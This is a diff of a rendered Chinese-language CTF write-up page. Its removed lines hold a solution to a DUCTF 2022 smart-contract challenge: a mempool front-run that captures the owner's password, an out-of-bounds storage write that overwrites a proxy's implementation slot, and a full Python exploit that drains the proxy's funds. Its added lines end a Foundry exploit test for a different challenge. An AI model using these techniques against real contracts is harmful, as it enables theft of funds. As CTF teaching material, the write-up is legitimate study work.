-<span class="w">            </span><span class="nx">mstore</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="nx">logEntries</span><span class="p">.</span><span class="nx">slot</span><span class="p">)</span>
-<span class="w">            </span><span class="nx">sstore</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">),</span><span class="w"> </span><span class="nx">logIndex</span><span class="p">),</span><span class="w"> </span><span class="nx">or</span><span class="p">(</span><span class="nx">mload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">logEntry</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">)),</span><span class="w"> </span><span class="nx">mul</span><span class="p">(</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">)))</span>
-<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">roll</span><span class="p">(</span><span class="mf">2</span><span class="p">);</span>
 
+<span class="w">        </span><span class="nx">IDAOFacet</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">).</span><span class="nx">castVoteBySig</span><span class="p">(</span><span class="nx">proposalId</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">signature</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">roll</span><span class="p">(</span><span class="mf">10</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">IDAOFacet</span><span class="p">(</span><span class="nx">pigeonDiamond</span><span class="p">).</span><span class="nx">executeProposal</span><span class="p">(</span><span class="nx">proposalId</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">setup</span><span class="p">.</span><span class="nx">isSolved</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
-</details>
-<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<ul>
-<li>目标是转移合约的所有资金，但是 <code>PrivateLog</code> 中并没有相关的函数</li>
-<li>题目描述中提到了合约 <code>TransparentUpgradeableProxy</code>，非管理员调用代理合约将 fallback 到逻辑合约，代理合约使用逻辑合约的代码，而其他属性则存储在代理合约内。可升级意味着逻辑合约是可以更改的</li>
-<li>
-<p>通过查看余额可以确认实际上需要转移的是代理合约的资金，那么显然需要更改代理合约中逻辑合约的地址，从而能够通过新的逻辑合约来转移资金</p>
-<ul>
-<li><code>TransparentUpgradeableProxy</code> 中逻辑合约的地址存储在固定的位置 <code>_IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code><sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup></li>
-</ul>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
-<span class="kn">from</span> <span class="nn">web3.middleware</span> <span class="kn">import</span> <span class="n">geth_poa_middleware</span>
-<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span>
-
-<span class="n">base_id</span> <span class="o">=</span> <span class="s1">&#39;fd313a3613eb393b&#39;</span>
-
-<span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;https://blockchain-privatelog-</span><span class="si">{</span><span class="n">base_id</span><span class="si">}</span><span class="s2">-eth.2022.ductf.dev&quot;</span><span class="p">))</span>
-<span class="n">w3</span><span class="o">.</span><span class="n">middleware_onion</span><span class="o">.</span><span class="n">inject</span><span class="p">(</span><span class="n">geth_poa_middleware</span><span class="p">,</span> <span class="n">layer</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
-
-<span class="n">info</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://blockchain-privatelog-</span><span class="si">{</span><span class="n">base_id</span><span class="si">}</span><span class="s1">.2022.ductf.dev/challenge&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
-
-<span class="n">account</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="s1">&#39;player_wallet&#39;</span><span class="p">][</span><span class="s1">&#39;private_key&#39;</span><span class="p">])</span>
-
-<span class="n">log_addr</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s1">&#39;contract_address&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
-<span class="n">proxy_addr</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s1">&#39;contract_address&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">log_addr</span><span class="p">))</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">proxy_addr</span><span class="p">))</span>
-
-<span class="c1"># 0</span>
-<span class="c1"># 100000000000000000000</span>
-</code></pre></div>
-</li>
-<li>
-<p><code>updateLogEntry()</code> 不检查 <code>logIndex</code>，而 <code>sstore(addr, val)</code> 可以将 <code>val</code> 写入 <code>addr</code>，可以借此来修改逻辑合约的地址</p>
-<ul>
-<li><code>keccak256(p, n)</code> 即 <code>keccak(mem[p…(p+n)))</code>，<code>mem[0, 20)</code> 对应 <code>logEntries.slot</code>，那么 <code>keccak256(0x00, 0x20)</code> 即 <code>keccak(2)</code>（slot 0 <code>Initializable</code> 的变量，slot 1 <code>secretHash</code>）</li>
-<li><code>keccak256(2)</code> 大于 <code>_IMPLEMENTATION_SLOT</code>，需要修改的 <code>logIndex</code> 为 <span class="arithmatex">\(2^{256}\)</span> - keccak256(2) + <code>_IMPLEMENTATION_SLOT</code></li>
-</ul>
-</li>
-<li>不过，<code>logEntry</code> 为 <code>string</code> 类型，存储方式与 <code>address</code> 不同<ul>
-<li>若字符串长度不超过 31 字节，将以 higher-order 存储，且最低字节存储 <code>length * 2</code>，如字符串 <code>hello</code> 将存储为 <code>0x68656c6c6f00000000000000000000000000000000000000000000000000000a</code>，而地址类型以 lower-order 存储</li>
-<li><code>logEntry</code> 最长支持 31 字节，那么最低字节是 <code>0x3e</code>，因此用于转移资金的逻辑合约地址最后 1 字节应为 <code>0x3e</code></li>
-</ul>
-</li>
-<li>接下来考虑如何获得 <code>updateLogEntry()</code> 的控制权。无论 <code>createLogEntry()</code> 或 <code>updateLogEntry()</code> 都需要知道当前的密码，并传入新密码的哈希。但 <code>owner</code> 每分钟都会调用 <code>createLogEntry()</code>，而每 23s 才产生一个新区块，可以通过 <code>pending</code> 的交易获得密码，并以更高的汽油费取得优先写入权，从而能够使用 <code>updateLogEntry()</code></li>
-</ul>
-<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
-<span class="kn">from</span> <span class="nn">web3.middleware</span> <span class="kn">import</span> <span class="n">geth_poa_middleware</span>
-<span class="kn">from</span> <span class="nn">eth_abi</span> <span class="kn">import</span> <span class="n">decode_abi</span>
-<span class="kn">from</span> <span class="nn">eth_utils</span> <span class="kn">import</span> <span class="n">keccak</span><span class="p">,</span> <span class="n">to_bytes</span><span class="p">,</span> <span class="n">to_checksum_address</span>
-<span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">compile_source</span>
-<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">rlp</span>
-
-<span class="k">def</span> <span class="nf">transact</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">gas</span><span class="o">=</span><span class="mi">1000000</span><span class="p">,</span> <span class="n">gas_price</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
-    <span class="n">tx</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">func</span><span class="p">)</span><span class="o">.</span><span class="n">buildTransaction</span><span class="p">({</span>
-        <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span><span class="p">,</span>
-        <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
-        <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="n">gas</span><span class="p">,</span>
-        <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">gas_price</span> <span class="k">if</span> <span class="n">gas_price</span> <span class="k">else</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
-    <span class="p">}))</span><span class="o">.</span><span class="n">rawTransaction</span>
-    <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
-    <span class="k">return</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
-
-<span class="n">base_id</span> <span class="o">=</span> <span class="s1">&#39;fd313a3613eb393b&#39;</span>
-
-<span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;https://blockchain-privatelog-</span><span class="si">{</span><span class="n">base_id</span><span class="si">}</span><span class="s2">-eth.2022.ductf.dev&quot;</span><span class="p">))</span>
-<span class="n">w3</span><span class="o">.</span><span class="n">middleware_onion</span><span class="o">.</span><span class="n">inject</span><span class="p">(</span><span class="n">geth_poa_middleware</span><span class="p">,</span> <span class="n">layer</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
-
-<span class="n">info</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://blockchain-privatelog-</span><span class="si">{</span><span class="n">base_id</span><span class="si">}</span><span class="s1">.2022.ductf.dev/challenge&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
-
-<span class="n">account</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">info</span><span class="p">[</span><span class="s1">&#39;player_wallet&#39;</span><span class="p">][</span><span class="s1">&#39;private_key&#39;</span><span class="p">])</span>
-<span class="n">log_addr</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s1">&#39;contract_address&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
-<span class="n">proxy_addr</span> <span class="o">=</span> <span class="n">info</span><span class="p">[</span><span class="s1">&#39;contract_address&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;address&#39;</span><span class="p">]</span>
-
-<span class="n">log_abi</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;abi.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-
-<span class="n">contract_log</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">proxy_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">log_abi</span><span class="p">)</span>
-
-<span class="n">tx_filter</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="s1">&#39;pending&#39;</span><span class="p">)</span>
-<span class="n">newHash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidityKeccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span>
-<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-    <span class="k">if</span> <span class="n">tx_hashes</span> <span class="o">:=</span> <span class="n">tx_filter</span><span class="o">.</span><span class="n">get_new_entries</span><span class="p">():</span>
-        <span class="n">tx</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction</span><span class="p">(</span><span class="n">tx_hashes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-        <span class="n">logEntry</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">decode_abi</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;bytes32&#39;</span><span class="p">],</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">tx</span><span class="o">.</span><span class="n">input</span><span class="p">[</span><span class="mi">10</span><span class="p">:]))</span>
-        <span class="n">transact</span><span class="p">(</span><span class="s2">&quot;contract_log.functions.createLogEntry(&#39;under the control&#39;, password, newHash)&quot;</span><span class="p">,</span> <span class="n">gas_price</span><span class="o">=</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span> <span class="o">+</span> <span class="mi">100</span><span class="p">)</span>
-        <span class="k">break</span>
-
-<span class="n">curr_nonce</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
-<span class="n">target_nonce</span> <span class="o">=</span> <span class="n">curr_nonce</span>
-<span class="n">sender_bytes</span> <span class="o">=</span> <span class="n">to_bytes</span><span class="p">(</span><span class="n">hexstr</span><span class="o">=</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
-<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-    <span class="n">addr_bytes</span> <span class="o">=</span> <span class="n">keccak</span><span class="p">(</span><span class="n">rlp</span><span class="o">.</span><span class="n">encode</span><span class="p">([</span><span class="n">sender_bytes</span><span class="p">,</span> <span class="n">target_nonce</span><span class="p">]))[</span><span class="mi">12</span><span class="p">:]</span>
-    <span class="n">target_address</span> <span class="o">=</span> <span class="n">to_checksum_address</span><span class="p">(</span><span class="n">addr_bytes</span><span class="p">)</span>
-    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">target_address</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3e</span><span class="p">:</span>
-        <span class="k">break</span>
-    <span class="n">target_nonce</span> <span class="o">+=</span> <span class="mi">1</span>
-
-<span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span>
-<span class="n">logIndex</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">256</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">solidityKeccak</span><span class="p">([</span><span class="s1">&#39;uint256&#39;</span><span class="p">],</span> <span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="n">hex</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">_IMPLEMENTATION_SLOT</span>
-<span class="n">logEntry</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">int</span><span class="p">(</span><span class="n">target_address</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="s2">064x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
-<span class="n">tx</span> <span class="o">=</span> <span class="n">contract_log</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">updateLogEntry</span><span class="p">(</span><span class="n">logIndex</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">31</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="n">newHash</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
-    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span><span class="p">,</span>
-    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
-    <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">1000000</span><span class="p">,</span>
-    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
-<span class="p">})</span>
-<span class="n">tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;41&#39;</span> <span class="o">*</span> <span class="mi">31</span><span class="p">,</span> <span class="n">logEntry</span><span class="p">)</span>    <span class="c1"># 可能存在 UTF-8 无法编码的字符，因此不直接传入 logEntry，而是采用替换的方式</span>
-<span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
-<span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">wait_for_transaction_receipt</span><span class="p">(</span><span class="n">tx_hash</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">getStorageAt</span><span class="p">(</span><span class="n">proxy_addr</span><span class="p">,</span> <span class="n">_IMPLEMENTATION_SLOT</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
-
-<span class="n">curr_nonce</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
-<span class="k">while</span> <span class="n">target_nonce</span> <span class="o">&gt;</span> <span class="n">curr_nonce</span><span class="p">:</span>
-    <span class="n">transact</span><span class="p">(</span><span class="s2">&quot;contract_log.functions.createLogEntry(&#39;under the control&#39;, &#39;password&#39;, newHash)&quot;</span><span class="p">)</span>
-    <span class="n">curr_nonce</span> <span class="o">+=</span> <span class="mi">1</span>
-
-<span class="n">hack_source</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
-<span class="s2">// SPDX-License-Identifier: MIT</span>
-<span class="s2">pragma solidity ^0.8.0;</span>
-<span class="s2">contract Hack {</span>
-<span class="s2">    function steal() public {</span>
-<span class="s2">        payable(msg.sender).transfer(100 ether);</span>
-<span class="s2">    }</span>
-<span class="s2">}</span>
-<span class="s2">&quot;&quot;&quot;</span>
-<span class="n">_</span><span class="p">,</span> <span class="n">hack_interface</span> <span class="o">=</span> <span class="n">compile_source</span><span class="p">(</span><span class="n">hack_source</span><span class="p">)</span><span class="o">.</span><span class="n">popitem</span><span class="p">()</span>
-<span class="n">hack_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">hack_interface</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">],</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">hack_interface</span><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">])</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">transact</span><span class="p">(</span><span class="s2">&quot;hack_contract.constructor()&quot;</span><span class="p">,</span> <span class="n">gas</span><span class="o">=</span><span class="n">hack_contract</span><span class="o">.</span><span class="n">constructor</span><span class="p">()</span><span class="o">.</span><span class="n">estimateGas</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">contractAddress</span><span class="p">)</span>
-
-<span class="n">contract_hack</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">proxy_addr</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">hack_interface</span><span class="p">[</span><span class="s1">&#39;abi&#39;</span><span class="p">])</span>
-<span class="n">transact</span><span class="p">(</span><span class="s2">&quot;contract_hack.functions.steal()&quot;</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://blockchain-privatelog-</span><span class="si">{</span><span class="n">base_id</span><span class="si">}</span><span class="s1">.2022.ductf.dev/challenge/solve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
-</code></pre></div>
 <h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
 <blockquote>
-<p>DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds}</p>
+<p>SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n’t_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}</p>
 </blockquote>
-<div class="footnote">
-<hr />
-<ol>
-<li id="fn:1">
-<p><a href="https://github1s.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/ERC1967/ERC1967Upgrade.sol#L28">ERC1967Upgrade - _IMPLEMENTATION_SLOT</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
-</li>
-</ol>
-</div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年9月30日 21:01:59</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年6月25日 20:33:15</span>
       
     
   </small>
@@ -3560,7 +3493,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../secret_and_ephemeral/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Secret and Ephemeral" rel="prev">
+        <a href="../pigeon_bank/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Pigeon Bank" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -3569,20 +3502,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              Secret and Ephemeral
+              Pigeon Bank
             </div>
           </div>
         </a>
       
       
         
-        <a href="../memory_master_on_the_chain/" class="md-footer__link md-footer__link--next" aria-label="下一页: 链上记忆大师" rel="next">
+        <a href="../../wargames/natas/" class="md-footer__link md-footer__link--next" aria-label="下一页: Natas" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              链上记忆大师
+              Natas
             </div>
           </div>
           <div class="md-footer__button md-icon">
